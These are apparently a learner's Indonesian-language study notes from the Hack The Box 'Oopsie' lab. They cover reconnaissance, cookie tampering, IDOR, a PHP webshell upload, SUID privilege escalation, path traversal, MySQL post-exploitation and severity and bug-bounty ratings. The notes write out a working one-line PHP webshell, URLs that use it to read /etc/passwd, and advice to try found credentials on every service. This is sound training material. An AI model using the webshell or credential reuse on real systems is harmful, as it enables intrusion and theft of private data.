# Resume Materi — HTB Machine: Oopsie 🐂
## [30 Apr 2026]

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ATTACK CHAIN OOPSIE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Nmap → Web Enum → Cookie Manipulation → IDOR
→ File Upload → RCE → SSH → SUID Exploit → ROOT

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 RECONNAISSANCE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Tool   : nmap
Tujuan : Temukan port terbuka & service yang berjalan

Perintah dasar :
  nmap -sV -sC <IP>
    -sV = deteksi versi service
    -sC = jalankan default scripts
    -T4 = kecepatan scan (1=lambat, 5=cepat)
    -p- = scan semua port (1-65535)
    -A  = aggressive scan (OS, version, script, traceroute)

Port penting yang wajib hapal :
  22  = SSH
  80  = HTTP
  443 = HTTPS
  21  = FTP
  3306= MySQL

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 WEB ENUMERATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Tool   : Gobuster
Tujuan : Temukan direktori & file tersembunyi di web server

Perintah :
  gobuster dir -u http://<IP> -w <wordlist> -x php
    dir  = mode directory enumeration
    -u   = target URL
    -w   = wordlist (daftar nama direktori yang dicoba)
    -x   = ekstensi file yang dicari (php, html, txt)
    -t   = jumlah threads (default 10, lebih tinggi = lebih cepat)

Wordlist default Kali :
  /usr/share/wordlists/dirb/common.txt      → umum
  /usr/share/wordlists/dirbuster/...        → lebih lengkap

Status code penting :
  200 = ada & bisa diakses
  301 = redirect (folder)
  403 = ada tapi dilarang akses
  404 = tidak ada

Web root Apache Ubuntu : /var/www/html/
Web root Nginx         : /usr/share/nginx/html/
Web root IIS (Windows) : C:\inetpub\wwwroot\

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 TOOLS WEB ANALYSIS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Burp Suite  = intercept & manipulasi HTTP request/response
  Proxy tab     → tangkap & edit request sebelum dikirim ke server
  Repeater tab  → simulasi/test request (tidak ubah browser)
  Target tab    → peta semua URL yang sudah dikunjungi browser
  Intercept on  → aktifkan untuk tangkap request dari browser

Firefox DevTools (F12) :
  Storage tab   → lihat & edit cookies langsung
  Network tab   → lihat request & response headers
  Inspector     → lihat source code HTML
  Ctrl+U        → lihat full source code halaman

Wappalyzer   = ekstensi browser, auto-detect tech stack

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 COOKIE & SESSION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Cookie  = data kecil yang disimpan browser, dikirim setiap request
          Dipakai server untuk "ingat" siapa kamu antar halaman

Contoh cookie berbahaya :
  role=guest → role=admin   ← server percaya begitu saja!
  user=2233  → user=34322   ← ganti ID user

Cara edit cookie :
  1. F12 → Storage → Cookies → edit langsung
  2. Burp Suite Proxy → intercept → edit di request

Perbedaan Repeater vs Proxy Intercept :
  Repeater  = simulasi request, TIDAK ubah cookie di browser
  Intercept = modifikasi request ASLI dari browser → efek nyata

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 VULNERABILITY: IDOR
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
IDOR = Insecure Direct Object Reference
Celah : server tidak validasi apakah user BOLEH akses resource itu

Contoh :
  /admin.php?id=2  → data guest
  /admin.php?id=1  → data admin (ID terkecil = dibuat pertama)

Teknik   : decrease/increase nilai parameter di URL
Pelajaran: selalu coba ubah angka ID di URL parameter!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 FILE UPLOAD + WEBSHELL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Webshell = file PHP berbahaya yang diupload ke server
           Memberi akses RCE (Remote Code Execution) via browser

Buat webshell :
  echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

Cara pakai :
  http://<IP>/uploads/shell.php?cmd=whoami
  http://<IP>/uploads/shell.php?cmd=ls+/var/www/html
  http://<IP>/uploads/shell.php?cmd=cat+/etc/passwd

Catatan penting :
  - Spasi di URL diganti + atau %20
  - Karakter spesial (>, &, ;) perlu URL encoding
  - Webshell stateless → tiap cmd= itu request baru, tidak bisa cd
  - Gunakan : cmd=ls+/folder/tujuan (bukan cd dulu)

Cara baca file PHP via webshell :
  cat     → gagal (PHP dieksekusi, bukan ditampilkan)
  strings → baca string dari binary/file
  od -c   → dump file sebagai karakter (paling reliable)
  wc -c   → hitung ukuran file (cek apakah kosong)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 LINUX COMMAND PENTING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
ls -la <path>     = lihat isi folder + permission detail
cat <file>        = tampilkan isi file
find / -group <X> = cari file milik group tertentu
find / -perm -4000= cari semua file SUID
od -c <file>      = baca file sebagai raw karakter
strings <file>    = ekstrak string dari file binary
wc -c <file>      = hitung ukuran file (bytes)
whoami            = tau kita login sebagai siapa
id                = info user + group kita

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 PRIVILEGE ESCALATION: SUID
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SUID = Set owner User ID
       File dengan SUID selalu jalan dengan privilege PEMILIKNYA
       bukan privilege yang menjalankannya

Ciri di permission : huruf s menggantikan x
  -rwsr-xr--  ← s di posisi owner execute = SUID aktif!

Cara cari file SUID :
  find / -perm -4000 2>/dev/null
  find / -group bugtracker 2>/dev/null

Eksploitasi : kalau SUID binary dimiliki root → jalankan = jalan sebagai root!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 PATH TRAVERSAL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Teknik  : masukkan ../ berulang untuk naik folder
          lalu masuk ke folder target

Contoh :
  Program baca : /root/reports/[INPUT]
  Input kita   : ../../../root/root.txt
  Hasil        : cat /root/reports/../../../root/root.txt
               = cat /root/root.txt ✓

Cara tau harus mundur berapa kali :
  1. Lihat error message → ketauan path aslinya
  2. Hitung kedalaman folder dari path error
  3. Tiap ../ = naik 1 level
  4. Kalau ragu → coba mulai dari banyak ../ lalu kurangi

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 SSH
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Perintah : ssh <user>@<IP>
Switch   :
  -p  = port berbeda dari default 22
  -i  = pakai private key file
  -v  = verbose/debug mode

Flag ada di  :
  User flag : /home/<user>/user.txt
  Root flag : /root/root.txt

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 PERMISSION LINUX — CARA BACA
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Format : [tipe][owner][group][others]
Contoh : -rwsr-xr--

  Tipe   : - = file biasa, d = direktori, l = symlink
  r = read    (4)
  w = write   (2)
  x = execute (1)
  s = SUID/SGID (execute + set ID)
  - = tidak ada permission

Urutan : owner (3) → group (3) → others (3)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ISTILAH PENTING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
RCE      = Remote Code Execution → eksekusi perintah di server dari jarak jauh
SUID     = Set owner User ID → file jalan sebagai pemiliknya
IDOR     = Insecure Direct Object Reference → akses resource tanpa validasi
Webshell = file berbahaya untuk RCE via browser
Cookie   = data sesi browser yang bisa dimanipulasi
Path Traversal = navigasi folder via ../ untuk akses file di luar batas
Foothold = akses awal ke sistem (contoh: dapat shell www-data)
Privesc  = Privilege Escalation → naik dari user biasa ke root
```

```
=== HTB Oopsie - Database & Post Exploitation - Resume Materi ===
[30 Apr 2026]

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 POST EXPLOITATION — MINDSET
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
CTF      : Dapat flag = selesai
Real     : Dapat akses = BARU MULAI
           → Eksplorasi semua data yang bisa diakses
           → Dokumentasi semua temuan sebagai bukti dampak
           → Database, file sensitif, kredensial lain = wajib dicari

Prinsip  : Setiap kredensial yang ditemukan → COBA ke semua service!
           Password db.php → coba SSH → coba MySQL → coba service lain

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 MENEMUKAN KREDENSIAL DI CONFIG FILE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
File konfigurasi PHP sering nyimpan kredensial database dalam plaintext
Lokasi umum yang wajib dicek :
  /var/www/html/                    → root web server Apache
  /var/www/html/cdn-cgi/login/      → folder aplikasi login
  /var/www/html/config.php          → file konfigurasi umum
  /var/www/html/db.php              → file koneksi database
  /var/www/html/includes/           → folder include/library

Cara baca file PHP via webshell :
  cat     → GAGAL (file dieksekusi server, bukan ditampilkan)
  strings → baca string dari binary/file
  od -c   → dump file sebagai karakter (PALING RELIABLE)
  wc -c   → hitung ukuuaran file (cek apakah kosong)

Contoh output od -c :
  0000000 < ? p h p \n $ c o n n =
  → Baca tiap karakter, abaikan angka di kiri (itu offset byte)
  → Gabungkan karakter → ketemu username & password

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 MySQL — KONEKSI & SWITCH
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Perintah : mysql -u [user] -p'[password]' [database]

Switch   :
  -u        = username database
  -p        = password (langsung nempel tanpa spasi!)
  -h        = host target (default: localhost)
  -P        = port (default: 3306)
  -e "SQL"  = eksekusi query langsung tanpa masuk prompt
  [db]      = nama database yang langsung dibuka (di akhir)

Contoh   :
  mysql -u robert -p'[pass]' garage         → masuk ke db garage
  mysql -u root -p                           → input password manual (aman)
  mysql -u user -p -h 10.10.10.1            → konek ke remote host

Warning "insecure" = normal, muncul karena password kelihatan di command
Solusi aman di real pentest → pakai -p saja, lalu input manual

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 SQL COMMANDS — WAJIB HAPAL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Navigasi :
  SHOW DATABASES;               → lihat semua database
  USE nama_database;            → pindah ke database lain
  SHOW TABLES;                  → lihat semua tabel di database aktif

Eksplorasi :
  DESCRIBE nama_tabel;          → lihat struktur kolom tabel
  SELECT * FROM nama_tabel;     → tampilkan SEMUA data tabel
  SELECT kolom FROM tabel;      → tampilkan kolom tertentu saja

Filter & kondisi :
  SELECT * FROM tabel WHERE kolom = 'nilai';   → filter data
  SELECT * FROM tabel LIMIT 5;                 → ambil 5 data saja
  SELECT * FROM tabel ORDER BY kolom;          → urutkan data

Lain-lain :
  EXIT;   atau  \q              → keluar dari MySQL prompt

Urutan logis eksplorasi database :
  1. SHOW TABLES            → tau ada tabel apa
  2. DESCRIBE tabel         → tau kolom apa yang ada
  3. SELECT * FROM tabel    → ambil semua datanya

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 DATA YANG DICARI SAAT POST EXPLOITATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Prioritas pencarian di database :
  1. Tabel users/accounts    → username, password (hash/plaintext)
  2. Tabel customers/clients → PII (nama, email, telepon, alamat)
  3. Tabel config/settings   → API key, token, kredensial lain
  4. Tabel logs              → aktivitas user, riwayat akses
  5. Semua tabel lain        → data bisnis sensitif

Kenapa PII = Critical :
  → Pelanggaran privasi user/klien
  → Denda GDPR bisa jutaan dollar (eropa)
  → Denda UU PDP (Indonesia)
  → Reputasi perusahaan hancur
  → Data bisa dipakai untuk phishing/social engineering

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 SEVERITY RATING — CVSS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Critical (9.0-10.0) → Dampak maksimal, eksploitasi mudah
High     (7.0-8.9)  → Dampak besar, butuh sedikit skill
Medium   (4.0-6.9)  → Dampak terbatas, ada mitigasi
Low      (0.1-3.9)  → Dampak kecil, susah dieksploit
Info     (0.0)      → Temuan informatif, bukan vulnerability

Contoh tiap level :
  Critical → RCE tanpa auth, SQL injection bocorkan semua DB,
             data breach PII ribuan user, auth bypass ke admin
  High     → RCE butuh auth dulu, IDOR expose data user lain,
             broken access control, SUID privesc
  Medium   → XSS butuh interaksi user, versi software outdated,
             cookie tanpa HttpOnly/Secure, directory listing aktif
  Low      → Banner grabbing, missing security headers,
             password policy lemah, error message verbose
  Info     → Port terbuka tapi tidak vulnerable,
             teknologi terdeteksi, SSL certificate info

Rumus penentu severity :
  Mudah dieksploit  + Dampak besar    = Critical
  Butuh kondisi     + Dampak besar    = High
  Butuh interaksi   + Dampak terbatas = Medium
  Susah dieksploit  + Dampak kecil    = Low

Dua pertanyaan kunci :
  1. Seberapa MUDAH dieksploit?
  2. Seberapa BESAR dampaknya?

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 BUG BOUNTY PRIORITY (P1-P5)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
P1 Critical → $10,000 - $100,000+
  Contoh : RCE di production, account takeover tanpa interaksi,
           akses semua data user tanpa login

P2 High     → $3,000 - $10,000
  Contoh : IDOR akses data user lain, privilege escalation ke admin,
           authentication bypass, RCE butuh auth dulu

P3 Medium   → $500 - $3,000
  Contoh : CSRF ubah data akun, Stored XSS di halaman ramai,
           Reflected XSS butuh klik link (social engineering)

P4 Low      → $100 - $500
  Contoh : Open redirect, rate limiting tidak ada di login,
           missing security headers

P5 Info     → $0 - $100 (atau swag)
  Contoh : Typo di halaman web, best practice tidak diikuti,
           missing headers minor

XSS — bedanya Stored vs Reflected :
  Stored XSS   → tersimpan di DB, otomatis jalan saat halaman dibuka
                 = P2 High (kena semua pengunjung)
  Reflected XSS → butuh korban klik link khusus dulu
                 = P3 Medium (ada barrier social engineering)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 OOPSIE — SEVERITY SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Cookie Manipulation       → P2 High
IDOR                      → P2 High
File Upload + RCE         → P1 Critical
Database dump + PII       → P1 Critical
SUID Privesc              → P1 Critical
Credential di config file → P2 High

Total estimasi bug bounty jika real program → $50,000+

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ISTILAH PENTING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PII          = Personally Identifiable Information
               data yang bisa identifikasi seseorang (nama, email, dll)
GDPR         = General Data Protection Regulation
               regulasi privasi data di Eropa, denda jutaan dollar
UU PDP       = Undang-Undang Perlindungan Data Pribadi (Indonesia)
Data Breach  = kebocoran data sensitif ke pihak yang tidak berwenang
CVSS         = Common Vulnerability Scoring System
               sistem penilaian severity vulnerability (0.0-10.0)
Hash         = enkripsi satu arah password (MD5, SHA1, bcrypt)
Plaintext    = password tersimpan tanpa enkripsi — sangat berbahaya!
Config File  = file konfigurasi aplikasi, sering berisi kredensial
Post Expl.   = aktivitas setelah dapat akses awal ke sistem target
```